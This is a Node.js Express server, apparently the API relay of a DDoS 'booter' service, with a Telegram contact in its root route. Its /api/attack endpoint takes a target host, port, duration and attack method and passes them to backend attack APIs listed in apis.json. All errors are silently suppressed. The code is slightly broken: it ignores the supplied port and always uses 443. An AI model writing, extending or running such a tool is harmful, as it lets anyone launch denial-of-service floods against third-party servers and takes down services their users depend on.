/*
    @Author: `sokin#3471
*/

const express = require("express");
     http = require("http"),
     axios = require("axios"),
     fs = require("fs"),
     app = express(),
     allapis = fs.readFileSync("apis.json"),
     methodFile = fs.readFileSync("apis.json");

app.get("/", (req, res) => {
    res.status(401).json({error: true, message: "Telegram: t.me/fbicat"});
});

app.get("/api/attack", async (req, res) => {
    const host = req.query.host;
     port = req.query.port,
     time = req.query.time,
     method = req.query.method,
     apis = JSON.parse(allapis),
     methods = JSON.parse(methodFile);
    if (!(host && port && time && method)) return res.send({"error": true, "message": "Missing parameters."});
    if (!apis[method]) return res.send({"error": true, "message": "Invalid method."});
    const sendreqallapis = methods[method].api.replace("<<$host>>", host).replace("<<$port>>", "443").replace("<<$time>>", time);
    axios.get(sendreqallapis).then(resp => {
        //console.log(resp);
        res.send(resp.data);
    });
});

app.listen("1337", () => {
    console.log(`Example app listening on port 1337`)
})

process.on('uncaughtException', err => (""));
process.on('unhandledRejection', err => (""));